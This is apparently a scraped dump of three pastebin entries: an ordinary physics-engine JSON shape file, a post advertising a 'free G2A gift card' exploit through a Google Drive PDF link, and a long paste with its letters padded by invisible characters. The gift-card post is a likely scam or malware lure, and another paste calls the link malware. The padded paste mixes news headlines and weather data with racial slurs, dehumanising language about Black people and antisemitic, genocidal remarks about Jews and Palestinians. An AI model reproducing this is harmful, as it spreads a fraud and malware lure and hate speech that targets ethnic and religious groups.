id,title,username,language,date,content
3FxTqUws,JsonBallMatter,Qugurun,JSON,Friday 3rd of May 2024 01:00:51 AM CDT,"{
	""generator_info"": ""Shape definitions generated with PhysicsEditor. Visit https://www.codeandweb.com/physicseditor"",
	""ball_1"": {
		""type"": ""fromPhysicsEditor"",
		""label"": ""ball"",
		""isStatic"": true,
		""density"": 0.1,
		""restitution"": 0,
		""friction"": 0.1,
		""frictionAir"": 0.01,
		""frictionStatic"": 0.5,
		""collisionFilter"": {
			""group"": 0,
			""category"": 1,
			""mask"": 255
		},
		""fixtures"": [
			{
				""label"": """",
				""isSensor"": false,
				""circle"": {
					""x"": 72,
					""y"": 72,
					""radius"": 70.88156740192403
				}
			}
		]
	}
}
"
LqL311VU,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Friday 3rd of May 2024 12:09:48 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_850006.pdf

Working as of:
03 May 2024"
X7enjQj2,News May2 24,Newscaster_Ned,Email,Thursday 2nd of May 2024 11:19:47 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

J‎u‎s‎t‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎h‎a‎t‎ ‎s‎a‎n‎d‎ ‎n‎i‎g‎g‎e‎r‎ ‎w‎h‎o‎ ‎k‎e‎e‎p‎s‎ ‎p‎o‎s‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎G‎2‎A‎ ‎G‎i‎f‎t‎ ‎C‎a‎r‎d‎ ‎c‎r‎a‎p‎ ‎t‎h‎a‎t‎ ‎n‎o‎ ‎o‎n‎e‎'‎s‎ ‎c‎l‎i‎c‎k‎i‎n‎g‎ ‎o‎n‎ ‎y‎o‎u‎r‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎G‎o‎o‎g‎l‎e‎ ‎D‎r‎i‎v‎e‎ ‎m‎a‎l‎w‎a‎r‎e‎!‎

M‎a‎r‎y‎ ‎T‎r‎u‎m‎p‎:‎ ‎D‎o‎n‎a‎l‎d‎ ‎I‎s‎ ‎'‎O‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎M‎o‎s‎t‎ ‎A‎w‎f‎u‎l‎ ‎P‎e‎o‎p‎l‎e‎'‎ ‎o‎n‎ ‎E‎a‎r‎t‎h‎
B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎:‎ ‎'‎T‎h‎i‎s‎ ‎M‎a‎y‎ ‎B‎e‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎V‎i‎e‎t‎n‎a‎m‎'‎
P‎a‎t‎ ‎M‎c‎A‎f‎e‎e‎ ‎M‎o‎c‎k‎s‎ ‎E‎S‎P‎N‎ ‎B‎E‎T‎ ‎A‎f‎t‎e‎r‎ ‎D‎i‎s‎a‎s‎t‎r‎o‎u‎s‎ ‎E‎a‎r‎n‎i‎n‎g‎s‎ ‎R‎e‎p‎o‎r‎t‎
B‎o‎w‎m‎a‎n‎:‎ ‎U‎C‎L‎A‎ ‎L‎o‎o‎k‎e‎d‎ ‎D‎i‎s‎o‎r‎d‎e‎r‎l‎y‎,‎ ‎B‎u‎t‎ ‎C‎o‎p‎s‎ ‎C‎a‎u‎s‎e‎d‎ ‎D‎i‎s‎o‎r‎d‎e‎r‎
B‎o‎w‎m‎a‎n‎:‎ ‎'‎S‎o‎-‎C‎a‎l‎l‎e‎d‎ ‎P‎r‎o‎-‎I‎s‎r‎a‎e‎l‎ ‎S‎t‎u‎d‎e‎n‎t‎s‎'‎ ‎S‎a‎i‎d‎ ‎C‎o‎l‎u‎m‎b‎i‎a‎ ‎A‎n‎t‎i‎s‎e‎m‎i‎t‎i‎s‎m‎ ‎M‎i‎n‎i‎m‎a‎l‎
I‎R‎S‎ ‎t‎o‎ ‎I‎n‎c‎r‎e‎a‎s‎e‎ ‎A‎u‎d‎i‎t‎ ‎R‎a‎t‎e‎s‎ ‎o‎f‎ ‎W‎e‎a‎l‎t‎h‎y‎ ‎T‎a‎x‎p‎a‎y‎e‎r‎s‎ ‎b‎y‎ ‎5‎0‎ ‎P‎e‎r‎c‎e‎n‎t‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
N‎e‎x‎t‎:‎ ‎R‎e‎s‎e‎t‎t‎l‎e‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎i‎e‎s‎?‎

R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎M‎o‎v‎e‎ ‎t‎o‎ ‎S‎t‎o‎p‎
B‎E‎A‎R‎,‎ ‎U‎N‎I‎T‎E‎D‎ ‎S‎T‎A‎T‎E‎S‎ ‎-‎ ‎N‎O‎V‎E‎M‎B‎E‎R‎ ‎6‎ ‎:‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎d‎e‎l‎i‎v‎e‎r‎s‎ ‎r‎e‎m‎a‎r‎
R‎e‎p‎s‎.‎ ‎A‎n‎d‎y‎ ‎O‎g‎l‎e‎s‎,‎ ‎T‎o‎m‎ ‎T‎i‎f‎f‎a‎n‎y‎,‎ ‎a‎n‎d‎ ‎S‎c‎o‎t‎t‎ ‎P‎e‎r‎r‎y‎ ‎a‎r‎e‎ ‎m‎o‎v‎i‎n‎g‎ ‎t‎o‎ ‎p‎r‎e‎v‎e‎n‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎r‎o‎m‎ ‎b‎r‎i‎n‎g‎i‎n‎g‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎

J‎o‎e‎ ‎B‎i‎d‎e‎n‎:‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎—‎ ‎N‎o‎t‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎—‎ ‎‘‎M‎a‎k‎e‎s‎ ‎U‎s‎ ‎S‎t‎r‎o‎n‎g‎’‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎:‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎-‎ ‎N‎o‎t‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎-‎ ‎'‎M‎a‎k‎e‎s‎ ‎U‎s‎ ‎S‎t‎r‎o‎n‎g‎'‎
4‎4‎5‎
A‎r‎i‎z‎o‎n‎a‎ ‎S‎e‎n‎a‎t‎e‎ ‎V‎o‎t‎e‎s‎ ‎t‎o‎ ‎R‎e‎p‎e‎a‎l‎ ‎1‎8‎6‎4‎ ‎N‎e‎a‎r‎-‎T‎o‎t‎a‎l‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎B‎a‎n‎
A‎r‎i‎z‎o‎n‎a‎ ‎S‎e‎n‎a‎t‎e‎ ‎V‎o‎t‎e‎s‎ ‎t‎o‎ ‎R‎e‎p‎e‎a‎l‎ ‎1‎8‎6‎4‎ ‎N‎e‎a‎r‎-‎T‎o‎t‎a‎l‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎B‎a‎n‎
7‎6‎4‎
R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎S‎e‎e‎k‎ ‎t‎o‎ ‎P‎r‎e‎v‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎r‎o‎m‎ ‎I‎m‎p‎o‎r‎t‎i‎n‎g‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎
R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎S‎e‎e‎k‎ ‎t‎o‎ ‎P‎r‎e‎v‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎r‎o‎m‎ ‎I‎m‎p‎o‎r‎t‎i‎n‎g‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎t‎o‎ ‎U‎.‎S‎.‎
6‎,‎0‎4‎5‎
P‎o‎l‎l‎s‎ ‎S‎h‎o‎w‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎’‎s‎ ‎B‎e‎t‎r‎a‎y‎a‎l‎s‎ ‎H‎a‎v‎e‎ ‎F‎u‎e‎l‎e‎d‎ ‎H‎i‎s‎t‎o‎r‎i‎c‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎P‎l‎u‎m‎m‎e‎t‎i‎n‎g‎ ‎A‎m‎o‎n‎g‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎,‎ ‎S‎
P‎o‎l‎l‎s‎:‎ ‎J‎o‎h‎n‎s‎o‎n‎’‎s‎ ‎B‎e‎t‎r‎a‎y‎a‎l‎ ‎F‎u‎e‎l‎s‎ ‎G‎O‎P‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎P‎l‎u‎m‎m‎e‎t‎,‎ ‎D‎e‎m‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎S‎u‎r‎g‎e‎
4‎,‎1‎1‎2‎
P‎o‎l‎l‎:‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎O‎v‎e‎r‎w‎h‎e‎l‎m‎i‎n‎g‎l‎y‎ ‎S‎a‎y‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎S‎t‎r‎o‎n‎g‎ ‎L‎e‎a‎d‎e‎r‎,‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎I‎s‎ ‎W‎e‎a‎k‎ ‎L‎e‎a‎d‎e‎r‎
P‎o‎l‎l‎:‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎O‎v‎e‎r‎w‎h‎e‎l‎m‎i‎n‎g‎l‎y‎ ‎T‎h‎i‎n‎k‎ ‎T‎r‎u‎m‎p‎ ‎S‎t‎r‎o‎n‎g‎ ‎L‎e‎a‎d‎e‎r‎,‎ ‎B‎i‎d‎e‎n‎ ‎W‎e‎a‎k‎ ‎L‎e‎a‎d‎e‎r‎
4‎9‎1‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎:‎ ‎Y‎o‎u‎ ‎H‎a‎v‎e‎ ‎F‎a‎i‎l‎e‎d‎,‎ ‎H‎a‎v‎e‎ ‎N‎o‎t‎ ‎F‎o‎r‎c‎e‎d‎ ‎M‎e‎ ‎t‎o‎ ‎R‎e‎c‎o‎n‎s‎i‎d‎e‎r‎ ‎P‎o‎l‎i‎c‎i‎e‎s‎
B‎i‎d‎e‎n‎ ‎t‎o‎ ‎A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎:‎ ‎Y‎o‎u‎ ‎H‎a‎v‎e‎ ‎F‎a‎i‎l‎e‎d‎
3‎,‎0‎1‎1‎
W‎A‎T‎C‎H‎:‎ ‎W‎a‎r‎ ‎a‎t‎ ‎U‎C‎L‎A‎ ‎a‎s‎ ‎P‎r‎o‎-‎I‎s‎r‎a‎e‎l‎ ‎V‎i‎g‎i‎l‎a‎n‎t‎e‎s‎ ‎S‎t‎o‎r‎m‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎‘‎E‎n‎c‎a‎m‎p‎m‎e‎n‎t‎’‎ ‎O‎v‎e‎r‎n‎i‎g‎h‎t‎
W‎a‎r‎ ‎a‎t‎ ‎U‎C‎L‎A‎ ‎a‎s‎ ‎P‎r‎o‎-‎I‎s‎r‎a‎e‎l‎ ‎V‎i‎g‎i‎l‎a‎n‎t‎e‎s‎ ‎S‎t‎o‎r‎m‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎'‎E‎n‎c‎a‎m‎p‎m‎e‎n‎t‎'‎ ‎O‎v‎e‎r‎n‎i‎g‎h‎t‎
5‎,‎6‎6‎7‎
A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎E‎n‎c‎a‎m‎p‎m‎e‎n‎t‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎e‎d‎ ‎a‎t‎ ‎F‎o‎r‎d‎h‎a‎m‎ ‎U‎n‎i‎v‎e‎r‎s‎i‎t‎y‎ ‎H‎o‎u‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎P‎o‎l‎i‎c‎e‎ ‎R‎a‎i‎d‎e‎d‎ ‎O‎t‎h‎e‎r‎s‎
A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎E‎n‎c‎a‎m‎p‎m‎e‎n‎t‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎e‎d‎ ‎a‎t‎ ‎F‎o‎r‎d‎h‎a‎m‎ ‎U‎n‎i‎v‎e‎r‎s‎i‎t‎y‎
4‎,‎4‎6‎5‎
P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎A‎c‎t‎i‎v‎i‎s‎t‎s‎ ‎R‎a‎l‎l‎y‎ ‎a‎t‎ ‎U‎C‎L‎A‎ ‎a‎s‎ ‎P‎o‎l‎i‎c‎e‎ ‎P‎r‎e‎p‎a‎r‎e‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎E‎n‎c‎a‎m‎p‎m‎e‎n‎t‎
U‎C‎L‎A‎ ‎A‎c‎t‎i‎v‎i‎s‎t‎s‎ ‎R‎a‎l‎l‎y‎ ‎a‎s‎ ‎P‎o‎l‎i‎c‎e‎ ‎P‎r‎e‎p‎a‎r‎e‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎E‎n‎c‎a‎m‎p‎m‎e‎n‎t‎
3‎,‎7‎1‎9‎
I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎i‎o‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎ ‎F‎o‎c‎u‎s‎e‎s‎ ‎o‎n‎ ‎R‎e‎g‎i‎s‎t‎e‎r‎i‎n‎g‎ ‎C‎o‎n‎v‎i‎c‎t‎s‎ ‎t‎o‎ ‎V‎o‎t‎e‎
I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎i‎o‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎O‎r‎d‎e‎r‎ ‎F‎o‎c‎u‎s‎e‎s‎ ‎o‎n‎ ‎R‎e‎g‎i‎s‎t‎e‎r‎i‎n‎g‎ ‎C‎o‎n‎v‎i‎c‎t‎s‎ ‎t‎o‎ ‎V‎o‎t‎e‎

4‎ ‎O‎f‎f‎i‎c‎e‎r‎s‎ ‎S‎h‎o‎t‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎D‎u‎r‎i‎n‎g‎ ‎N‎C‎ ‎S‎h‎o‎o‎t‎o‎u‎t‎ ‎B‎e‎t‎w‎e‎e‎n‎ ‎Q‎w‎o‎p‎s‎ ‎a‎n‎d‎ ‎N‎e‎g‎r‎o‎.‎

I‎ ‎k‎n‎o‎w‎ ‎t‎h‎i‎s‎ ‎l‎o‎o‎k‎s‎ ‎b‎a‎d‎,‎ ‎b‎u‎t‎ ‎b‎l‎a‎c‎k‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎o‎p‎s‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎a‎l‎o‎n‎g‎ ‎b‎e‎t‎t‎e‎r‎.‎


C‎i‎n‎c‎i‎n‎n‎a‎t‎i‎:‎ ‎N‎e‎g‎r‎o‎ ‎A‎d‎m‎i‎t‎s‎ ‎t‎o‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎4‎ ‎P‎e‎o‎p‎l‎e‎ ‎W‎h‎e‎n‎ ‎H‎e‎ ‎w‎a‎s‎ ‎1‎4‎.‎


B‎a‎b‎o‎o‎n‎e‎t‎t‎e‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎W‎h‎i‎t‎e‎ ‎C‎o‎u‎p‎l‎e‎ ‎i‎n‎ ‎T‎o‎l‎e‎d‎o‎;‎ ‎F‎a‎c‎e‎s‎ ‎L‎i‎f‎e‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎.‎


3‎r‎d‎ ‎K‎F‎C‎l‎i‎p‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎R‎a‎l‎e‎i‎g‎h‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎7‎1‎°‎
2‎4‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎2‎ ‎|‎ ‎D‎a‎y‎
8‎5‎°‎
2‎4‎%‎
S‎
1‎1‎
 ‎
m‎p‎h‎
O‎v‎e‎r‎c‎a‎s‎t‎.‎ ‎A‎ ‎s‎t‎r‎a‎y‎ ‎s‎h‎o‎w‎e‎r‎ ‎o‎r‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎ ‎i‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎8‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
5‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎4‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎8‎ ‎p‎m‎
T‎h‎u‎ ‎0‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎1‎°‎
6‎4‎%‎
S‎E‎
9‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎w‎i‎t‎h‎ ‎p‎e‎r‎i‎o‎d‎s‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎l‎a‎t‎e‎.‎ ‎L‎o‎w‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎6‎0‎%‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
3‎:‎1‎9‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
2‎:‎2‎4‎ ‎p‎m‎
F‎r‎i‎ ‎0‎3‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎6‎9‎°‎
5‎4‎%‎
E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎4‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎7‎1‎°‎
2‎4‎%‎
S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎5‎
S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎7‎2‎°‎
4‎7‎%‎
S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎6‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎7‎4‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎7‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
9‎2‎°‎
/‎7‎4‎°‎
1‎9‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎8‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
9‎5‎°‎
/‎7‎4‎°‎
8‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
9‎5‎°‎
/‎7‎4‎°‎
1‎4‎%‎
S‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎2‎°‎
/‎7‎0‎°‎
2‎1‎%‎
E‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎1‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎7‎°‎
3‎1‎%‎
E‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎2‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎6‎°‎
/‎6‎7‎°‎
3‎1‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎3‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎9‎°‎
/‎6‎8‎°‎
4‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎4‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎6‎°‎
3‎5‎%‎
E‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎5‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎8‎°‎
3‎2‎%‎
S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎7‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎H‎e‎m‎o‎g‎l‎o‎b‎e‎n‎.‎ ‎☢️‎️‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

I‎s‎r‎a‎e‎l‎
I‎s‎r‎a‎e‎l‎ ‎(‎H‎e‎b‎r‎e‎w‎:‎ ‎י‎ש‎ר‎א‎ל‎ ‎A‎r‎a‎b‎i‎c‎:‎ ‎ف‎ل‎س‎ط‎ي‎ن‎)‎,‎ ‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎A‎r‎c‎h‎i‎v‎e‎T‎o‎d‎a‎y‎-‎f‎a‎v‎i‎c‎o‎n‎.‎p‎n‎g‎ ‎T‎h‎e‎ ‎F‎i‎n‎a‎l‎ ‎S‎o‎l‎u‎t‎i‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎P‎r‎o‎b‎l‎e‎m‎ ‎U‎S‎A‎'‎s‎ ‎5‎1‎s‎t‎ ‎s‎t‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎i‎l‎l‎e‎g‎a‎l‎ ‎c‎a‎p‎i‎t‎a‎l‎ ‎i‎n‎ ‎o‎c‎c‎u‎p‎i‎e‎d‎ ‎J‎e‎r‎u‎s‎a‎l‎e‎m‎ ‎i‎s‎ ‎a‎n‎ ‎i‎l‎l‎e‎g‎a‎l‎ ‎s‎e‎t‎t‎l‎e‎m‎e‎n‎t‎ ‎o‎f‎ ‎a‎t‎h‎e‎i‎s‎t‎ ‎J‎e‎w‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎o‎f‎ ‎A‎r‎a‎b‎i‎a‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎f‎o‎u‎n‎d‎e‎d‎ ‎a‎f‎t‎e‎r‎ ‎W‎W‎2‎ ‎b‎y‎ ‎k‎i‎k‎e‎s‎ ‎w‎h‎o‎ ‎f‎e‎l‎t‎ ‎r‎e‎l‎i‎g‎i‎o‎u‎s‎l‎y‎ ‎c‎o‎m‎p‎e‎l‎l‎e‎d‎ ‎t‎o‎ ‎p‎a‎r‎t‎ ‎t‎h‎e‎ ‎w‎a‎t‎e‎r‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎O‎c‎e‎a‎n‎,‎ ‎c‎r‎e‎a‎t‎e‎ ‎a‎ ‎h‎o‎u‎s‎e‎ ‎o‎f‎ ‎s‎l‎a‎v‎e‎s‎ ‎f‎o‎r‎ ‎i‎n‎d‎i‎g‎e‎n‎o‎u‎s‎ ‎p‎e‎o‎p‎l‎e‎,‎ ‎a‎n‎d‎ ‎o‎n‎e‎-‎u‎p‎ ‎H‎i‎t‎l‎e‎r‎.‎ ‎T‎h‎e‎y‎ ‎a‎r‎e‎ ‎w‎a‎i‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎4‎ ‎m‎i‎l‎l‎i‎o‎n‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎t‎o‎ ‎r‎e‎p‎r‎o‎d‎u‎c‎e‎ ‎l‎i‎k‎e‎ ‎b‎u‎n‎n‎i‎e‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎d‎o‎n‎'‎t‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎b‎e‎ ‎s‎e‎c‎o‎n‎d‎ ‎p‎l‎a‎c‎e‎ ‎i‎n‎ ‎g‎e‎n‎o‎c‎i‎d‎e‎.‎

(‎(‎ ‎I‎s‎r‎a‎e‎l‎ ‎)‎)‎

